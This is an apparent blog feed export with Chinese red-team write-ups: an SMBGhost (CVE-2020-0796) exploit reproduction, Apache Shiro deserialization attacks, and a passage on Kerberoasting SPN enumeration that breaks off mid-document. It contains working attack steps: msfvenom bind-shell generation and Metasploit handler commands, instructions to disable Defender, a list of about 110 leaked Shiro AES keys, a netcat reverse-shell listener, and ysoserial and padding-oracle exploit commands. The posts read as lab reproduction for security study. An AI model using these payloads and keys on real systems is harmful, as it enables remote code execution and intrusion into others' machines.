        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00漏洞介绍"><a href="#0x00漏洞介绍" class="headerlink" title="0x00漏洞介绍"></a>0x00漏洞介绍</h1><p>漏洞介绍</p><p>微软SMBv3 Client/Server远程代码执行漏洞CVE-2020-0796</p><p>影响范围：<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p><h1 id="0x01复现坑点：坑点比较多看一下"><a href="#0x01复现坑点：坑点比较多看一下" class="headerlink" title="0x01复现坑点：坑点比较多看一下"></a>0x01复现坑点：坑点比较多看一下</h1><p>EXP地址：</p><p><a href="https://github.com/chompie1337/SMBGhost\_RCE\_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost\_RCE\_PoC</a></p><ul><li>Win10 版本有限制，具体我自己用的下面这个成功的</li></ul><p>ed2k://|file|cn_windows_10_business_editions_version_1903_updated_sept_2019_x64_dvd_2f5281e1.iso|5231140864|B1D5C4C401036B0B1EBA64476A95F338|/</p><ul><li>python 版本</li></ul><p>python 3.6 可以成功！</p><p>python 3.6 可以成功！</p><p>python 3.7 和 2 实测蓝屏</p><p>不懂为啥，有大佬知道可以指导一下弟弟</p><ul><li><p>payload要正向监听</p></li><li><p>补丁也有坑，KB4551762讲道理是没有，但是win10的补丁，看见就那几个，但是那个补丁里面可能有包含这个补丁</p></li><li><p>需要关闭defender防火墙</p></li></ul><h1 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h1><p>首先使用systeminfo看一下补丁（KB4551762）</p><p>我新装的，肯定没啥问题，</p><ul><li>msf生成木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;4444 -b &#39;\x00&#39; -i 1 -f python</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTI5MTkucG5n?x-oss-process=image/format,png" alt="image-20200605112919799"></p><ul><li><p>EXP替换shellcode</p><p>把buf 替换成USER_PAYLOAD</p></li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTMwMzUucG5n?x-oss-process=image/format,png" alt="image-20200605113034988"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 6666</span><br><span class="line">set rhost 192.168.31.235</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTQ5MTEucG5n?x-oss-process=image/format,png" alt="image-20200605114911778"><br><img src="https://img-blog.csdnimg.cn/20200629164706690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>运行EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.100.54</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTE0MTIucG5n?x-oss-process=image/format,png" alt="image-20200605111412505"></p><p>最终拿到shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMzM5NDUucG5n?x-oss-process=image/format,png" alt="image-20200605133945470"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红队武器库-Apache Shiro 反序列化漏洞</title>
      <link href="/2020/06/03/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93-Apache%20Shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/06/03/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93-Apache%20Shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Apache-Shiro-RememberMe-反序列化（Shiro550）"><a href="#Apache-Shiro-RememberMe-反序列化（Shiro550）" class="headerlink" title="Apache Shiro RememberMe 反序列化（Shiro550）"></a>Apache Shiro RememberMe 反序列化（Shiro550）</h1><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p><h2 id="影响组件"><a href="#影响组件" class="headerlink" title="影响组件"></a>影响组件</h2><p>Apache Shiro &lt;= 1.2.4</p><h2 id="实际漏洞影响范围"><a href="#实际漏洞影响范围" class="headerlink" title="实际漏洞影响范围"></a>实际漏洞影响范围</h2><p>如果shiro的rememberMe功能的AES密钥被泄露, 就会导致反序列化漏洞，无论Shiro是什么版本。</p><h2 id="目前网上收集到的密钥"><a href="#目前网上收集到的密钥" class="headerlink" title="目前网上收集到的密钥"></a>目前网上收集到的密钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</span><br><span class="line">0AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">1AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;</span><br><span class="line">25BsmdYwjnfcWmnhAciDDg&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">3JvYhmBLUs0ETA5Kprsdag&#x3D;&#x3D;</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg&#x3D;&#x3D;</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">6AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">6NfXkC7YVCV5DASIrEm1Rg&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;</span><br><span class="line">cmVtZW1iZXJNZQAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">7AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">9AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">OUHYQzxQ&#x2F;W9e&#x2F;UjiAGu6rg&#x3D;&#x3D;</span><br><span class="line">a3dvbmcAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">aU1pcmFjbGVpTWlyYWNsZQ&#x3D;&#x3D;</span><br><span class="line">bWljcm9zAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ&#x3D;&#x3D;</span><br><span class="line">bXRvbnMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;</span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2Nzg5MGFiY2RlZg&#x3D;&#x3D;</span><br><span class="line">L7RioUULEFhRyxM7a2R&#x2F;Yg&#x3D;&#x3D;</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ&#x3D;&#x3D;</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw&#x3D;&#x3D;</span><br><span class="line">OY&#x2F;&#x2F;C4rhfwNxCQAQCrQQ1Q&#x3D;&#x3D;</span><br><span class="line">5J7bIJIV0LQSN3c9LPitBQ&#x3D;&#x3D;</span><br><span class="line">f&#x2F;SY5TIve5WWzT4aQlABJA&#x3D;&#x3D;</span><br><span class="line">bya2HkYo57u6fWh5theAWw&#x3D;&#x3D;</span><br><span class="line">WuB+y2gcHRnY2Lg9+Aqmqg&#x3D;&#x3D;</span><br><span class="line">kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">ZWvohmPdUsAWT3&#x3D;KpPqda</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">cGljYXMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br><span class="line">CrownKey&#x3D;&#x3D;a12d&#x2F;dakdad</span><br><span class="line">empodDEyMwAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">A7UzJgh1+EWj5oBFi+mSgw&#x3D;&#x3D;</span><br><span class="line">YTM0NZomIzI2OTsmIzM0NTueYQ&#x3D;&#x3D;</span><br><span class="line">c2hpcm9fYmF0aXMzMgAAAA&#x3D;&#x3D;</span><br><span class="line">i45FVt72K2kLgvFrJtoZRw&#x3D;&#x3D;</span><br><span class="line">U3BAbW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZnJlc2h6Y24xMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">Jt3C93kMR9D5e8QzwfsiMw&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2NzgxMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">vXP33AonIp9bFwGl7aT7rA&#x3D;&#x3D;</span><br><span class="line">V2hhdCBUaGUgSGVsbAAAAA&#x3D;&#x3D;</span><br><span class="line">Z3h6eWd4enklMjElMjElMjE&#x3D;</span><br><span class="line">Q01TX0JGTFlLRVlfMjAxOQ&#x3D;&#x3D;</span><br><span class="line">ZAvph3dsQs0FSL3SDFAdag&#x3D;&#x3D;</span><br><span class="line">Is9zJ3pzNh2cgTHB4ua3+Q&#x3D;&#x3D;</span><br><span class="line">NsZXjXVklWPZwOfkvk6kUA&#x3D;&#x3D;</span><br><span class="line">GAevYnznvgNCURavBhCr1w&#x3D;&#x3D;</span><br><span class="line">66v1O8keKNV3TTcGPK1wzg&#x3D;&#x3D;</span><br><span class="line">SDKOLKn2J1j&#x2F;2BHjeZwAoQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>推荐工具 <a href="https://github.com/feihong-cs/ShiroExploit\_GUI/" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit\_GUI/</a></p><p>环境搭建：推荐docker</p><p>简单检测，抓包重放后，如果显示rememberMe=deleteMe，说明有可利用性</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjYxNDMyMDYucG5n?x-oss-process=image/format,png" alt="image-20200526143206170"></p><h3 id="Shiro550无需提供rememberMe-Cookie"><a href="#Shiro550无需提供rememberMe-Cookie" class="headerlink" title="Shiro550无需提供rememberMe Cookie"></a>Shiro550无需提供rememberMe Cookie</h3><p>因为该漏洞没有回显, 所以我们需要先确认漏洞是否存在</p><p>这里用DNS解析记录来做判断, 在<a href="http://www.dnslog.cn/上获取子域" target="_blank" rel="noopener">http://www.dnslog.cn/上获取子域</a></p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-qMyl0JGb-1591176591939)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200526134702.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200526134702.png\)\]</a></p><p>VPS启动一个nc -lvp 666</p><p>反弹shell</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-E2Ywd8hN-1591176591940)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200526135057.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200526135057.png\)\]</a></p><p>成功</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjYxMzUyMjEucG5n?x-oss-process=image/format,png" alt="image-20200526135221232"></p><h1 id="Apache-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#Apache-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="Apache Shiro Padding Oracle Attack (Shiro-721)"></a>Apache Shiro Padding Oracle Attack (Shiro-721)</h1><p>Apache Shiro 是企业常见的 Java安全框架, 由于<code>Shiro</code>使用<code>AES-CBC</code>模式进行加解密处理, 所以存在<code>Padding Oracle Attack</code>漏洞, 已经登录的攻击者同样可以进行反序列化操作</p><h2 id="影响组件-1"><a href="#影响组件-1" class="headerlink" title="影响组件"></a>影响组件</h2><p>Apache Shiro &lt; 1.4.2</p><p>Apache Shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>shiro 环境war包 <a href="https://github.com/jas502n/SHIRO-721" target="_blank" rel="noopener">https://github.com/jas502n/SHIRO-721</a></p><p>搭建环境 tomcat7 + shiro 1.4.1</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-s52cCJP5-1591176591942)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200527140205.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200527140205.png\)\]</a></p><p>该漏洞需要登录后获取到合法的<code>Cookie: rememberMe=XXX</code>后才可以进行利用</p><p>看起来不是很好利用但实际上有一些网站是开放注册的</p><p>而且这个洞不需要知道服务端密钥，因为该漏洞需是爆破Cookie</p><p>访问shiro登录页面，并登陆</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNDAzMDAucG5n?x-oss-process=image/format,png" alt="image-20200527140300087"></p><p>登陆后，访问一个业务，抓包</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-2EvvYPE2-1591176591943)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200526145750.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200526145750.png\)\]</a></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNDA0MDcucG5n?x-oss-process=image/format,png" alt="image-20200527140407681"></p><p>按照要求填入 rememberMe Cookie</p><p>图形化工具失败，不知道怎么回事，利用原始的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 &#39;touch &#x2F;tmp&#x2F;zeo&#39; &gt; payload.class</span><br></pre></td></tr></table></figure><p>exp 下载地址 <a href="https://github.com/Geekby/shiro\_rce\_exp" target="_blank" rel="noopener">https://github.com/Geekby/shiro\_rce\_exp</a></p><p>执行exp爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exp.py http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;samples-web-1.4.1&#x2F; X8E4mP300AMIGgimdqHhecoyzK64eNcoovKC5xa+G67RC4OA6mrky14UY5bYLHJhjc5lndRe5iU&#x2F;cRt4NyDa0QguUKKNC3eBIYqSIVrx5uFLrBs9dzFhG46oMhcIXh80IwXcR8PYSUrm1V2dCydUBdOHLEahzysAi4ED&#x2F;zxv8HQyvQYaSCdkJdKP5Kh8yagxYNvl6GBCO0FyLxn&#x2F;dzeVuCfyPh6fIJi9uEIdJ5e72UTKAph+ot5DpcolN2l0DibOE7NCm74YpBrw43RlTNJrtBLh2ngsphanUPpC42K3TZgrXieiMnotTi3VODQmgIa+fF0+ZVxKBOl7VwMlZzJgkmxY2e5Ql28Q2VVt+Wk+jEad&#x2F;zok70ZjDUUCiopEJlYIlkG22C1zbEbia8IUMtRTsJZnF612x4YvlfX9RFo6bnWXpS&#x2F;bKFwbaJPiFr6bSTfSy1LInH9u1vscfSMEB8YZ+w6aq73kH3szftfbm&#x2F;MskuWgqfU28ZLPAbml4IhH3n7c payload.class</span><br></pre></td></tr></table></figure><p>经过了爆破</p><p>得到padding oracle attack后的cookie</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNzAzMzEucG5n?x-oss-process=image/format,png" alt="image-20200527170142533"></p><p>复制该cookie，重放即可成功执行命令</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNzAzMTYucG5n?x-oss-process=image/format,png" alt="image-20200527170316763"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.oniont.cn/index.php/archives/298.html" target="_blank" rel="noopener">http://www.oniont.cn/index.php/archives/298.html</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全:Kerberoasting攻击和SPN服务</title>
      <link href="/2020/05/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberoasting%E6%94%BB%E5%87%BB%E5%92%8CSPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2020/05/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberoasting%E6%94%BB%E5%87%BB%E5%92%8CSPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-SPN"><a href="#0x01-SPN" class="headerlink" title="0x01 SPN"></a>0x01 SPN</h1><p>SPN（ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。</p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p><p>Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN</p><p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p><p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p><p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxNDM2MzIucG5n?x-oss-process=image/format,png" alt="image-20200518143632006"></p><h1 id="0x02-SPN发现"><a href="#0x02-SPN发现" class="headerlink" title="0x02 SPN发现"></a>0x02 SPN发现</h1><p>由于每台服务器都需要注册用于Kerberos身份验证服务的SPN</p><p>所以这是一个更加隐蔽的方法来收集有关内网域环境的信息</p><h2 id="查询SPN服务，内网探测"><a href="#查询SPN服务，内网探测" class="headerlink" title="查询SPN服务，内网探测"></a>查询SPN服务，内网探测</h2><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测</p><h3 id="使用SetSPN"><a href="#使用SetSPN" class="headerlink" title="使用SetSPN"></a>使用SetSPN</h3><p>Win7和Windows Server2008自带的工具</p><p>查看当前域内的所有SPN：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q *&#x2F;*</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxNDMyMjcucG5n?x-oss-process=image/format,png" alt="image-20200518143227803"></p><p>查看test域内的所有SPN：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -T test -q *&#x2F;*</span><br></pre></td></tr></table></figure><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-yd2XpX1l-1590547189992)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200518143251.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200518143251.png\)\]</a></p><p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN</p><p>有三个：</p><p>域控制器：</p><p>CN=DC,OU=Domain Controllers,DC=sun,DC=com</p><p>域用户帐户：</p><p>CN=krbtgt,CN=Users,DC=sun,DC=com</p><p>机器帐户：</p><p>CN=WIN7,CN=Computers,DC=sun,DC=com</p><p>其他命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 